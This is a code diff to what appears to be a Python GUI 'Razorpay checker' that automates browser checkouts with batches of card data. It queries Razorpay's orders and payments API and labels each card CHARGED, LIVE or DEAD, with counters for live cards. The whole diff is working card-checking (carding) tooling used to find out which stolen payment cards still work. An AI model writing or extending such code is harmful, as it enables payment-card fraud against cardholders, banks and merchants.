@@ -132,55 +132,71 @@ async def check_card_async(browser, card_data):
         
         await asyncio.sleep(4)
         
-        # Detect result
         page_text = await page.content()
         page_url = page.url
         
-        # OTP page = card is LIVE
-        if any(x in page_text.lower() for x in ["enter otp", "otp", "verification code", "authenticate"]):
-            await context.close()
-            return "LIVE", {"last4": last4, "bin": bin6, "type": "OTP Required"}
+        # STEP 1: Check Razorpay API (order + payments)
+        status, amt_paid, attempts = get_order_status(order_id)
         
-        # 3DS redirect
-        if "acs" in page_url.lower() or "three-ds" in page_url.lower() or "3ds" in page_url.lower():
+        # Also fetch payments for this order
+        import requests as req
+        payments_resp = req.get(
+            f"https://api.razorpay.com/v1/orders/{order_id}/payments",
+            auth=(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET), timeout=10
+        )
+        payments = payments_resp.json().get("items", []) if payments_resp.status_code == 200 else []
+        
+        # Analyze payment if exists
+        if payments:
+            p = payments[0]
+            p_status = p.get("status", "unknown")
+            p_error = p.get("error_code")
+            p_error_desc = p.get("error_description", "")
+            
+            if p_status in ("captured", "authorized"):
+                await context.close()
+                return "CHARGED", {"last4": last4, "bin": bin6, 
+                                    "type": f"{p_status} ₹{p.get('amount',0)/100}"}
+            
+            if p_status in ("created", "attempted") and not p_error:
+                await context.close()
+                return "LIVE", {"last4": last4, "bin": bin6, "type": "OTP/3DS Required"}
+            
+            if p_error:
+                await context.close()
+                return "DEAD", {"last4": last4, "bin": bin6, "reason": p_error_desc or p_error}
+        
+        # No payments - check order status
+        if status == "paid" or amt_paid > 0:
+            await context.close()
+            return "CHARGED", {"last4": last4, "bin": bin6, "type": f"Paid ₹{amt_paid/100}"}
+        
+        if status == "attempted" and attempts > 0:
+            await context.close()
+            return "LIVE", {"last4": last4, "bin": bin6, "type": "OTP/3DS Required"}
+        
+        if status in ("failed", "cancelled"):
+            decline_words = ["declined", "insufficient", "do not honor", "stolen",
+                           "restricted", "incorrect", "card blocked"]
+            reason = status
+            for kw in decline_words:
+                if kw in page_text.lower():
+                    reason = kw.title()
+                    break
+            await context.close()
+            return "DEAD", {"last4": last4, "bin": bin6, "reason": reason}
+        
+        # STEP 2: Page indicators
+        if any(x in page_text.lower() for x in ["enter otp", "otp sent", "verification code"]):
+            await context.close()
+            return "LIVE", {"last4": last4, "bin": bin6, "type": "OTP Page"}
+        
+        if "acs" in page_url.lower() or "3ds" in page_url.lower():
             await context.close()
             return "LIVE", {"last4": last4, "bin": bin6, "type": "3DS Challenge"}
         
-        # Success page
-        if "success" in page_url.lower() or "payment_id" in page_url:
-            await context.close()
-            return "LIVE", {"last4": last4, "bin": bin6, "type": "Payment OK"}
-        
-        # Decline keywords
-        decline_words = [
-            "declined", "insufficient", "do not honor", "stolen", "pickup",
-            "restricted", "incorrect", "not valid", "issuer declined",
-            "transaction not permitted", "not completed", "card blocked"
-        ]
-        for kw in decline_words:
-            if kw in page_text.lower():
-                await context.close()
-                return "DEAD", {"last4": last4, "bin": bin6, "reason": kw.title()}
-        
-        # Check via API
-        status, amt_paid, attempts = get_order_status(order_id)
-        
-        if status == "paid" or amt_paid > 0:
-            await context.close()
-            return "LIVE", {"last4": last4, "bin": bin6, "type": f"Paid ₹{amt_paid/100}"}
-        
-        # attempted + attempts>0 = bank processed the card → LIVE (OTP/3DS pending)
-        if status == "attempted" and attempts > 0:
-            await context.close()
-            return "LIVE", {"last4": last4, "bin": bin6, "type": "Attempted (Bank OK)"}
-        
-        # failed/cancelled = card declined
-        if status in ("failed", "cancelled"):
-            await context.close()
-            return "DEAD", {"last4": last4, "bin": bin6, "reason": f"Status: {status}"}
-        
         await context.close()
-        return "UNKNOWN", {"last4": last4, "bin": bin6, "reason": f"Status: {status}"}
+        return "UNKNOWN", {"last4": last4, "bin": bin6, "reason": f"Order: {status}"}
         
     except Exception as e:
         await context.close()
@@ -511,7 +527,7 @@ class RazorpayCheckerGUI(ctk.CTk):
                     status, details = await check_card_async(browser, card)
                     self.result_queue.put((idx, card, status, details))
                     
-                    if status == "LIVE":
+                    if status == "CHARGED" or status == "LIVE":
                         self.live_count += 1
                     elif status == "DEAD":
                         self.dead_count += 1
@@ -557,8 +573,8 @@ class RazorpayCheckerGUI(ctk.CTk):
         row = ctk.CTkFrame(self.results_frame, fg_color=BG3, height=28)
         row.pack(fill="x", pady=1)
         
-        colors = {"LIVE": GREEN, "DEAD": RED, "ERROR": YELLOW, "ORDER_FAIL": YELLOW, "UNKNOWN": GRAY}
-        emoji = {"LIVE": "🟢", "DEAD": "🔴", "ERROR": "🟡", "ORDER_FAIL": "🟡", "UNKNOWN": "⚪"}
+        colors = {"CHARGED": GREEN, "LIVE": YELLOW, "DEAD": RED, "ERROR": YELLOW, "UNKNOWN": GRAY}
+        emoji = {"CHARGED": "💰", "LIVE": "🟡", "DEAD": "🔴", "ERROR": "🟡", "UNKNOWN": "⚪"}
         
         color = colors.get(status, GRAY)
         em = emoji.get(status, "⚪")
